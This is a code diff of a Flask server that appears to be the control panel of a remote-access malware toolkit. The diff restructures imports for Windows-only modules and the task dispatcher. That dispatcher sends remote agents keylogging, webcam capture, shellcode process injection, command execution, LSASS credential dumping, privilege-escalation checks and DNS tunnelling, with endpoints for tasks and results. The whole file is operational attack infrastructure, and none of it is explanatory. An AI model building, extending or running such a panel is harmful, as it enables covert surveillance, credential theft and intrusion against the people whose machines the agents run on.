@@ -1,35 +1,43 @@
 import sys
 import os
+import platform
 
 # Add the parent directory to the Python path
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from flask import Flask, render_template, request, jsonify
 from modules.shellcode import ShellcodeGenerator
-from modules.evasion import Evasion
-from modules.keylogger import Keylogger
-from modules.webcam import WebcamCapture
-from modules.process_injection import ProcessInjector
-from modules.post_exploit import PostExploit
 from modules.dns_tunnel import DNSTunnel
-from modules.credential_dump import CredentialDump
-from modules.priv_esc import PrivilegeEscalation
 import threading
 import logging
 from datetime import datetime
+
+# Only import Windows-specific modules if running on Windows
+IS_WINDOWS = platform.system().lower() == "windows"
+if IS_WINDOWS:
+    from modules.evasion import Evasion
+    from modules.keylogger import Keylogger
+    from modules.webcam import WebcamCapture
+    from modules.process_injection import ProcessInjector
+    from modules.credential_dump import CredentialDump
+    from modules.priv_esc import PrivilegeEscalation
+    from modules.post_exploit import PostExploit
 
 app = Flask(__name__)
 
 # Initialize global instances
 shellcode_gen = ShellcodeGenerator()
-evasion = Evasion()
-keylogger = Keylogger()
-webcam = WebcamCapture()
-process_injector = ProcessInjector()
-post_exploit = PostExploit()
 dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain
-cred_dump = CredentialDump()
-priv_esc = PrivilegeEscalation()
+
+# Initialize Windows-specific instances only if on Windows
+if IS_WINDOWS:
+    evasion = Evasion()
+    keylogger = Keylogger()
+    webcam = WebcamCapture()
+    process_injector = ProcessInjector()
+    post_exploit = PostExploit()
+    cred_dump = CredentialDump()
+    priv_esc = PrivilegeEscalation()
 
 # Global storage for agents and tasks
 agents = {}
@@ -91,6 +99,47 @@ def create_task():
     
     return jsonify({'task_id': task_id})
 
+def execute_task(agent_id, task_id, task_type, task_data):
+    try:
+        result = None
+        
+        # Only execute Windows-specific tasks if running on Windows
+        if IS_WINDOWS:
+            if task_type == 'keylogger':
+                result = keylogger.start()
+            elif task_type == 'webcam':
+                result = webcam.capture()
+            elif task_type == 'process_injection':
+                result = process_injector.inject(
+                    task_data.get('process'),
+                    task_data.get('shellcode')
+                )
+            elif task_type == 'post_exploit':
+                result = post_exploit.execute(task_data.get('command'))
+            elif task_type == 'credential_dump':
+                result = cred_dump.dump_lsass()
+            elif task_type == 'privilege_escalation':
+                result = priv_esc.check_windows_services()
+        
+        # Cross-platform tasks
+        if task_type == 'dns_tunnel':
+            result = dns_tunnel.start_tunnel()
+            
+        if result:
+            results[task_id] = {
+                'agent_id': agent_id,
+                'result': result,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+    except Exception as e:
+        logging.error(f"Error executing task: {str(e)}")
+        results[task_id] = {
+            'agent_id': agent_id,
+            'error': str(e),
+            'timestamp': datetime.now().isoformat()
+        }
+
 @app.route('/api/results/<task_id>', methods=['GET'])
 def get_result(task_id):
     result = results.get(task_id)
@@ -113,43 +162,6 @@ def submit_result():
         }
         return jsonify({'status': 'success'})
     return jsonify({'status': 'error'}), 400
-
-def execute_task(agent_id, task_id, task_type, task_data):
-    try:
-        result = None
-        
-        if task_type == 'keylogger':
-            result = keylogger.start()
-        elif task_type == 'webcam':
-            result = webcam.capture()
-        elif task_type == 'process_injection':
-            result = process_injector.inject(
-                task_data.get('process'),
-                task_data.get('shellcode')
-            )
-        elif task_type == 'post_exploit':
-            result = post_exploit.execute(task_data.get('command'))
-        elif task_type == 'dns_tunnel':
-            result = dns_tunnel.start_tunnel()
-        elif task_type == 'credential_dump':
-            result = cred_dump.dump_lsass()
-        elif task_type == 'privilege_escalation':
-            result = priv_esc.check_windows_services()
-            
-        if result:
-            results[task_id] = {
-                'agent_id': agent_id,
-                'result': result,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-    except Exception as e:
-        logging.error(f"Error executing task: {str(e)}")
-        results[task_id] = {
-            'agent_id': agent_id,
-            'error': str(e),
-            'timestamp': datetime.now().isoformat()
-        }
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001) 
